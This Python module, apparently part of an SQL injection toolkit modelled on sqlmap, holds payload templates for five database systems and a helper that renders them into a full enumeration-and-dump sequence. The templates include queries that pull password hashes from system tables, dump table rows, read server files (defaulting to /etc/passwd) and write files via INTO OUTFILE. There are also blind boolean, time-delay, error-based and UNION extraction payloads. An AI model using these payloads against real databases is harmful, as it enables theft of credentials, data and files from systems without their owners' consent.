"""
Enumeration / extraction SQL per DBMS — mirrors sqlmap queries.xml coverage
for banner, users, dbs, tables, columns, dump, file, and boolean/time extract wrappers.
"""

from __future__ import annotations

from typing import Any

# Placeholders: {db} {table} {col} {query} {index} {pos} {char} {len} {offset} {limit} {file} {marker}

QUERIES: dict[str, dict[str, str]] = {
    "MySQL": {
        "banner": "SELECT VERSION()",
        "current_user": "SELECT CURRENT_USER()",
        "current_db": "SELECT DATABASE()",
        "hostname": "SELECT @@HOSTNAME",
        "is_dba": "SELECT (SELECT super_priv FROM mysql.user WHERE user=SUBSTRING_INDEX(CURRENT_USER(),'@',1) LIMIT 1)='Y'",
        "users": "SELECT user FROM mysql.user",
        "passwords": "SELECT CONCAT(user,0x3a,authentication_string) FROM mysql.user",
        "privileges": "SELECT grantee,privilege_type FROM information_schema.user_privileges",
        "dbs": "SELECT schema_name FROM information_schema.schemata",
        "tables": "SELECT table_name FROM information_schema.tables WHERE table_schema='{db}'",
        "columns": "SELECT column_name FROM information_schema.columns WHERE table_schema='{db}' AND table_name='{table}'",
        "count": "SELECT COUNT(*) FROM `{db}`.`{table}`",
        "dump": "SELECT `{col}` FROM `{db}`.`{table}` LIMIT {offset},1",
        "dump_row": "SELECT CONCAT_WS(0x3a,{cols}) FROM `{db}`.`{table}` LIMIT {offset},1",
        "search_table": "SELECT table_schema,table_name FROM information_schema.tables WHERE table_name LIKE '%{query}%'",
        "search_column": "SELECT table_schema,table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%{query}%'",
        "file_read": "SELECT LOAD_FILE('{file}')",
        "file_write": "SELECT '{query}' INTO OUTFILE '{file}'",
        # blind extraction helpers
        "length": "SELECT LENGTH(({query}))",
        "char_at": "SELECT ORD(MID(({query}),{pos},1))",
        "bool_char": "ORD(MID(({query}),{pos},1))={char}",
        "bool_len": "LENGTH(({query}))={len}",
        "bool_gt_len": "LENGTH(({query}))>{len}",
        "bool_gt_char": "ORD(MID(({query}),{pos},1))>{char}",
        "error_extractvalue": "extractvalue(1,concat(0x7e,({query}),0x7e))",
        "error_updatexml": "updatexml(1,concat(0x7e,({query}),0x7e),1)",
        "union_select": "UNION SELECT {cols}",
        "time_if": "IF(({query}),SLEEP({sleep}),0)",
    },
    "PostgreSQL": {
        "banner": "SELECT VERSION()",
        "current_user": "SELECT CURRENT_USER",
        "current_db": "SELECT CURRENT_DATABASE()",
        "hostname": "SELECT inet_server_addr()",
        "is_dba": "SELECT usesuper FROM pg_user WHERE usename=CURRENT_USER",
        "users": "SELECT usename FROM pg_user",
        "passwords": "SELECT usename||':'||passwd FROM pg_shadow",
        "privileges": "SELECT usename,usecreatedb,usesuper FROM pg_user",
        "dbs": "SELECT datname FROM pg_database",
        "tables": "SELECT tablename FROM pg_tables WHERE schemaname='public'",
        "columns": "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
        "count": "SELECT COUNT(*) FROM {table}",
        "dump": "SELECT {col} FROM {table} LIMIT 1 OFFSET {offset}",
        "dump_row": "SELECT CONCAT_WS(':',{cols}) FROM {table} LIMIT 1 OFFSET {offset}",
        "search_table": "SELECT schemaname,tablename FROM pg_tables WHERE tablename LIKE '%{query}%'",
        "search_column": "SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%{query}%'",
        "file_read": "SELECT pg_read_file('{file}',0,100000)",
        "length": "SELECT LENGTH(({query}))",
        "char_at": "SELECT ASCII(SUBSTR(({query}),{pos},1))",
        "bool_char": "ASCII(SUBSTR(({query}),{pos},1))={char}",
        "bool_len": "LENGTH(({query}))={len}",
        "bool_gt_len": "LENGTH(({query}))>{len}",
        "bool_gt_char": "ASCII(SUBSTR(({query}),{pos},1))>{char}",
        "error_cast": "CAST(({query}) AS NUMERIC)",
        "time_if": "CASE WHEN ({query}) THEN pg_sleep({sleep}) ELSE pg_sleep(0) END",
    },
    "Microsoft SQL Server": {
        "banner": "SELECT @@VERSION",
        "current_user": "SELECT SYSTEM_USER",
        "current_db": "SELECT DB_NAME()",
        "hostname": "SELECT @@SERVERNAME",
        "is_dba": "SELECT IS_SRVROLEMEMBER('sysadmin')",
        "users": "SELECT name FROM master..syslogins",
        "passwords": "SELECT name+':'+master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins",
        "privileges": "SELECT name,sysadmin,securityadmin FROM master..syslogins",
        "dbs": "SELECT name FROM master..sysdatabases",
        "tables": "SELECT name FROM {db}..sysobjects WHERE xtype='U'",
        "columns": "SELECT name FROM {db}..syscolumns WHERE id=(SELECT id FROM {db}..sysobjects WHERE name='{table}')",
        "count": "SELECT COUNT(*) FROM {db}..{table}",
        "dump": "SELECT TOP 1 {col} FROM (SELECT ROW_NUMBER() OVER (ORDER BY (SELECT 1)) AS r,{col} FROM {db}..{table}) t WHERE r={offset}+1",
        "length": "SELECT LEN(({query}))",
        "char_at": "SELECT ASCII(SUBSTRING(({query}),{pos},1))",
        "bool_char": "ASCII(SUBSTRING(({query}),{pos},1))={char}",
        "bool_len": "LEN(({query}))={len}",
        "bool_gt_len": "LEN(({query}))>{len}",
        "bool_gt_char": "ASCII(SUBSTRING(({query}),{pos},1))>{char}",
        "error_convert": "CONVERT(INT,({query}))",
        "time_if": "IF({query}) WAITFOR DELAY '0:0:{sleep}'",
        "file_read": "SELECT * FROM OPENROWSET(BULK '{file}',SINGLE_CLOB) AS x",
    },
    "Oracle": {
        "banner": "SELECT banner FROM v$version WHERE ROWNUM=1",
        "current_user": "SELECT user FROM dual",
        "current_db": "SELECT SYS.DATABASE_NAME FROM dual",
        "hostname": "SELECT UTL_INADDR.GET_HOST_NAME FROM dual",
        "is_dba": "SELECT sys_context('userenv','isdba') FROM dual",
        "users": "SELECT username FROM all_users",
        "dbs": "SELECT DISTINCT owner FROM all_tables",
        "tables": "SELECT table_name FROM all_tables WHERE owner='{db}'",
        "columns": "SELECT column_name FROM all_tab_columns WHERE owner='{db}' AND table_name='{table}'",
        "count": "SELECT COUNT(*) FROM {db}.{table}",
        "dump": "SELECT {col} FROM (SELECT {col},ROWNUM r FROM {db}.{table}) WHERE r={offset}+1",
        "length": "SELECT LENGTH(({query})) FROM dual",
        "char_at": "SELECT ASCII(SUBSTR(({query}),{pos},1)) FROM dual",
        "bool_char": "ASCII(SUBSTR(({query}),{pos},1))={char}",
        "bool_len": "LENGTH(({query}))={len}",
        "bool_gt_len": "LENGTH(({query}))>{len}",
        "bool_gt_char": "ASCII(SUBSTR(({query}),{pos},1))>{char}",
        "time_if": "CASE WHEN ({query}) THEN DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),{sleep}) ELSE 0 END",
    },
    "SQLite": {
        "banner": "SELECT sqlite_version()",
        "current_user": "SELECT 'sqlite'",
        "current_db": "SELECT 'main'",
        "hostname": "SELECT 'localhost'",
        "is_dba": "SELECT 1",
        "users": "SELECT 'sqlite'",
        "dbs": "SELECT name FROM pragma_database_list",
        "tables": "SELECT name FROM sqlite_master WHERE type='table'",
        "columns": "SELECT name FROM pragma_table_info('{table}')",
        "count": "SELECT COUNT(*) FROM {table}",
        "dump": "SELECT {col} FROM {table} LIMIT 1 OFFSET {offset}",
        "length": "SELECT LENGTH(({query}))",
        "char_at": "SELECT UNICODE(SUBSTR(({query}),{pos},1))",
        "bool_char": "UNICODE(SUBSTR(({query}),{pos},1))={char}",
        "bool_len": "LENGTH(({query}))={len}",
        "bool_gt_len": "LENGTH(({query}))>{len}",
        "bool_gt_char": "UNICODE(SUBSTR(({query}),{pos},1))>{char}",
        "time_if": "CASE WHEN ({query}) THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) ELSE 1 END",
    },
}


def list_dbms() -> list[str]:
    return list(QUERIES.keys())


def get_query(dbms: str, name: str, **kwargs: Any) -> dict[str, Any]:
    """Return a rendered enumeration query for the DBMS."""
    key = None
    for k in QUERIES:
        if k.lower() == dbms.lower() or dbms.lower() in k.lower():
            key = k
            break
    if not key:
        # aliases
        aliases = {
            "mysql": "MySQL",
            "mariadb": "MySQL",
            "postgres": "PostgreSQL",
            "postgresql": "PostgreSQL",
            "mssql": "Microsoft SQL Server",
            "sqlserver": "Microsoft SQL Server",
            "oracle": "Oracle",
            "sqlite": "SQLite",
        }
        key = aliases.get(dbms.lower())
    if not key or key not in QUERIES:
        raise ValueError(f"unsupported dbms '{dbms}'. Choose: {list_dbms()}")
    catalog = QUERIES[key]
    if name not in catalog:
        raise ValueError(f"unknown query '{name}' for {key}. Available: {sorted(catalog)}")
    tpl = catalog[name]
    # default placeholders
    vals = {
        "db": kwargs.get("db", "mysql"),
        "table": kwargs.get("table", "users"),
        "col": kwargs.get("col", "id"),
        "cols": kwargs.get("cols", "id,name"),
        "query": kwargs.get("query", catalog.get("banner", "SELECT 1")),
        "index": kwargs.get("index", 0),
        "pos": kwargs.get("pos", 1),
        "char": kwargs.get("char", 65),
        "len": kwargs.get("len", 1),
        "offset": kwargs.get("offset", 0),
        "limit": kwargs.get("limit", 1),
        "file": kwargs.get("file", "/etc/passwd"),
        "sleep": kwargs.get("sleep", 3),
        "marker": kwargs.get("marker", "psec"),
    }
    try:
        rendered = tpl.format(**vals)
    except KeyError as e:
        raise ValueError(f"missing placeholder {e} for query {name}") from e
    return {
        "dbms": key,
        "name": name,
        "sql": rendered,
        "template": tpl,
        "available": sorted(catalog.keys()),
    }


def enum_plan(dbms: str = "MySQL") -> dict[str, Any]:
    """Full enumeration sequence like sqlmap --banner --current-user --dbs --tables ..."""
    steps = [
        "banner",
        "current_user",
        "current_db",
        "hostname",
        "is_dba",
        "users",
        "dbs",
        "tables",
        "columns",
        "count",
        "dump",
    ]
    plan = []
    for s in steps:
        try:
            plan.append(get_query(dbms, s))
        except ValueError:
            continue
    return {"dbms": dbms, "steps": plan, "count": len(plan)}
